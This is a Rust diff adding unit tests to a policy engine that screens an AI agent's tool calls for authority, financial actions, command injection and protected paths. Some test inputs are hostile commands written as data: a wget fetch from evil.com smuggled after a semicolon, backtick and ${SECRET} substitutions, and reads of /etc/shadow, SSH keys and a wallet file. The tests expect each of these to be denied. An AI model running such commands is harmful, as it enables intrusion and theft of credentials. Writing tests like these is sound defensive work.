@@ -336,7 +336,7 @@ impl PolicyRule for RateLimitRule {
     fn evaluate(&self, call: &ToolCallRequest, _ctx: &PolicyContext) -> PolicyDecision {
         let now = Instant::now();
         let window_start = now - Duration::from_secs(60);
-        let mut guard = self.calls.lock().expect("rate limit mutex");
+        let mut guard = self.calls.lock().unwrap_or_else(|e| e.into_inner());
         let cuts = guard.entry(call.tool_name.clone()).or_default();
         Self::prune_older_than(cuts, window_start);
         if cuts.len() >= self.max_calls_per_minute as usize {
@@ -641,5 +641,300 @@ mod tests {
             risk_level: RiskLevel::Safe,
         };
         assert!(rule.evaluate(&ok, &ctx).is_allowed());
+    }
+
+    // ── collect_string_values for nested structures ──────────────────
+
+    #[test]
+    fn collect_string_values_nested_arrays() {
+        let val = serde_json::json!([["a", "b"], ["c"]]);
+        let mut out = Vec::new();
+        collect_string_values(&val, &mut out);
+        assert_eq!(out, vec!["a", "b", "c"]);
+    }
+
+    #[test]
+    fn collect_string_values_nested_objects() {
+        let val = serde_json::json!({"a": {"b": "deep", "c": 42}, "d": "top"});
+        let mut out = Vec::new();
+        collect_string_values(&val, &mut out);
+        assert!(out.contains(&"deep".to_string()));
+        assert!(out.contains(&"top".to_string()));
+        assert_eq!(out.len(), 2); // numbers are skipped
+    }
+
+    #[test]
+    fn collect_string_values_mixed() {
+        let val = serde_json::json!({
+            "items": [{"name": "file.txt"}, {"name": "dir/sub.py"}],
+            "count": 2,
+            "flag": true,
+            "label": "test"
+        });
+        let mut out = Vec::new();
+        collect_string_values(&val, &mut out);
+        assert!(out.contains(&"file.txt".to_string()));
+        assert!(out.contains(&"dir/sub.py".to_string()));
+        assert!(out.contains(&"test".to_string()));
+        assert_eq!(out.len(), 3);
+    }
+
+    #[test]
+    fn collect_string_values_primitives_skipped() {
+        let val = serde_json::json!(42);
+        let mut out = Vec::new();
+        collect_string_values(&val, &mut out);
+        assert!(out.is_empty());
+
+        let val = serde_json::json!(true);
+        collect_string_values(&val, &mut out);
+        assert!(out.is_empty());
+
+        let val = serde_json::json!(null);
+        collect_string_values(&val, &mut out);
+        assert!(out.is_empty());
+    }
+
+    // ── Peer authority level ─────────────────────────────────────────
+
+    #[test]
+    fn authority_peer_allows_safe_blocks_caution() {
+        let rule = AuthorityRule;
+        let ctx = PolicyContext {
+            authority: InputAuthority::Peer,
+            survival_tier: SurvivalTier::Normal,
+        };
+
+        assert!(
+            rule.evaluate(&make_request("echo", RiskLevel::Safe), &ctx)
+                .is_allowed()
+        );
+        assert!(
+            rule.evaluate(&make_request("read_file", RiskLevel::Caution), &ctx)
+                .is_allowed()
+        );
+        assert!(
+            !rule
+                .evaluate(&make_request("write_file", RiskLevel::Dangerous), &ctx)
+                .is_allowed()
+        );
+    }
+
+    // ── FinancialRule extract_amount_cents variants ───────────────────
+
+    #[test]
+    fn financial_extract_amount_cents_various_keys() {
+        // "amount" key
+        assert_eq!(
+            FinancialRule::extract_amount_cents(&serde_json::json!({"amount": 5000})),
+            Some(5000)
+        );
+        // "amount_cents" key
+        assert_eq!(
+            FinancialRule::extract_amount_cents(&serde_json::json!({"amount_cents": 3000})),
+            Some(3000)
+        );
+        // "cents" key
+        assert_eq!(
+            FinancialRule::extract_amount_cents(&serde_json::json!({"cents": 1500})),
+            Some(1500)
+        );
+        // "value_cents" key
+        assert_eq!(
+            FinancialRule::extract_amount_cents(&serde_json::json!({"value_cents": 2000})),
+            Some(2000)
+        );
+        // "dollars" key (converted to cents)
+        assert_eq!(
+            FinancialRule::extract_amount_cents(&serde_json::json!({"dollars": 25.0})),
+            Some(2500)
+        );
+        // "value" key (converted to cents)
+        assert_eq!(
+            FinancialRule::extract_amount_cents(&serde_json::json!({"value": 10.50})),
+            Some(1050)
+        );
+        // No matching key
+        assert_eq!(
+            FinancialRule::extract_amount_cents(&serde_json::json!({"other": 42})),
+            None
+        );
+        // Non-object
+        assert_eq!(
+            FinancialRule::extract_amount_cents(&serde_json::json!("not an object")),
+            None
+        );
+    }
+
+    #[test]
+    fn financial_is_financial_tool_names() {
+        assert!(FinancialRule::is_financial_tool("transfer_usdc"));
+        assert!(FinancialRule::is_financial_tool("send_payment"));
+        assert!(FinancialRule::is_financial_tool("withdraw_funds"));
+        assert!(FinancialRule::is_financial_tool("deposit_eth"));
+        assert!(FinancialRule::is_financial_tool("process_payment"));
+        assert!(FinancialRule::is_financial_tool("wallet_balance"));
+        assert!(!FinancialRule::is_financial_tool("read_file"));
+        assert!(!FinancialRule::is_financial_tool("echo"));
+    }
+
+    #[test]
+    fn financial_wallet_config_drain_patterns() {
+        assert!(FinancialRule::is_wallet_config_or_drain(
+            &serde_json::json!({"drain": true})
+        ));
+        assert!(FinancialRule::is_wallet_config_or_drain(
+            &serde_json::json!({"withdraw_all": true})
+        ));
+        assert!(FinancialRule::is_wallet_config_or_drain(
+            &serde_json::json!({"export_private_key": true})
+        ));
+        assert!(FinancialRule::is_wallet_config_or_drain(
+            &serde_json::json!({"set_wallet_path": "/tmp/evil"})
+        ));
+        assert!(!FinancialRule::is_wallet_config_or_drain(
+            &serde_json::json!({"amount": 100})
+        ));
+        assert!(!FinancialRule::is_wallet_config_or_drain(
+            &serde_json::json!("not an object")
+        ));
+    }
+
+    // ── ValidationRule looks_malicious patterns ──────────────────────
+
+    #[test]
+    fn validation_looks_malicious_wget() {
+        let rule = ValidationRule;
+        let ctx = PolicyContext {
+            authority: InputAuthority::Creator,
+            survival_tier: SurvivalTier::Normal,
+        };
+
+        let wget_inject = ToolCallRequest {
+            tool_name: "run".into(),
+            params: serde_json::json!({ "cmd": "; wget http://evil.com/payload" }),
+            risk_level: RiskLevel::Safe,
+        };
+        assert!(!rule.evaluate(&wget_inject, &ctx).is_allowed());
+    }
+
+    #[test]
+    fn validation_looks_malicious_backtick() {
+        let rule = ValidationRule;
+        let ctx = PolicyContext {
+            authority: InputAuthority::Creator,
+            survival_tier: SurvivalTier::Normal,
+        };
+
+        let backtick = ToolCallRequest {
+            tool_name: "run".into(),
+            params: serde_json::json!({ "cmd": "echo $(`whoami`)" }),
+            risk_level: RiskLevel::Safe,
+        };
+        assert!(!rule.evaluate(&backtick, &ctx).is_allowed());
+    }
+
+    #[test]
+    fn validation_looks_malicious_dollar_brace() {
+        let rule = ValidationRule;
+        let ctx = PolicyContext {
+            authority: InputAuthority::Creator,
+            survival_tier: SurvivalTier::Normal,
+        };
+
+        let dollar_brace = ToolCallRequest {
+            tool_name: "run".into(),
+            params: serde_json::json!({ "cmd": "echo ${SECRET}" }),
+            risk_level: RiskLevel::Safe,
+        };
+        assert!(!rule.evaluate(&dollar_brace, &ctx).is_allowed());
+    }
+
+    // ── Path protection with nested params ───────────────────────────
+
+    #[test]
+    fn path_protection_detects_nested_protected_paths() {
+        let rule = PathProtectionRule::default();
+        let ctx = PolicyContext {
+            authority: InputAuthority::Creator,
+            survival_tier: SurvivalTier::Normal,
+        };
+
+        let nested = ToolCallRequest {
+            tool_name: "process".into(),
+            params: serde_json::json!({
+                "files": [{"path": "/etc/shadow"}]
+            }),
+            risk_level: RiskLevel::Safe,
+        };
+        assert!(!rule.evaluate(&nested, &ctx).is_allowed());
+    }
+
+    #[test]
+    fn path_protection_wallet_json() {
+        let rule = PathProtectionRule::default();
+        let ctx = PolicyContext {
+            authority: InputAuthority::Creator,
+            survival_tier: SurvivalTier::Normal,
+        };
+
+        let wallet = ToolCallRequest {
+            tool_name: "read_file".into(),
+            params: serde_json::json!({ "path": "data/wallet.json" }),
+            risk_level: RiskLevel::Safe,
+        };
+        assert!(!rule.evaluate(&wallet, &ctx).is_allowed());
+    }
+
+    #[test]
+    fn path_protection_ssh_dir() {
+        let rule = PathProtectionRule::default();
+        let ctx = PolicyContext {
+            authority: InputAuthority::Creator,
+            survival_tier: SurvivalTier::Normal,
+        };
+
+        let ssh = ToolCallRequest {
+            tool_name: "read_file".into(),
+            params: serde_json::json!({ "path": ".ssh/id_rsa" }),
+            risk_level: RiskLevel::Safe,
+        };
+        assert!(!rule.evaluate(&ssh, &ctx).is_allowed());
+    }
+
+    // ── PolicyEngine ordering ────────────────────────────────────────
+
+    #[test]
+    fn engine_evaluates_rules_in_priority_order() {
+        let mut engine = PolicyEngine::new();
+        engine.add_rule(Box::new(ValidationRule)); // priority 6
+        engine.add_rule(Box::new(AuthorityRule)); // priority 1
+        engine.add_rule(Box::new(CommandSafetyRule)); // priority 2
+
+        // Authority check (priority 1) should run first
+        let ctx = PolicyContext {
+            authority: InputAuthority::External,
+            survival_tier: SurvivalTier::Normal,
+        };
+        let decision = engine.evaluate_all(&make_request("nuke", RiskLevel::Dangerous), &ctx);
+        assert!(!decision.is_allowed());
+        if let PolicyDecision::Deny { rule, .. } = &decision {
+            assert_eq!(rule, "authority", "authority rule should fire first");
+        }
+    }
+
+    #[test]
+    fn engine_default_is_empty() {
+        let engine = PolicyEngine::default();
+        let ctx = PolicyContext {
+            authority: InputAuthority::External,
+            survival_tier: SurvivalTier::Normal,
+        };
+        // No rules -> allow
+        assert!(
+            engine
+                .evaluate_all(&make_request("anything", RiskLevel::Forbidden), &ctx)
+                .is_allowed()
+        );
     }
 }
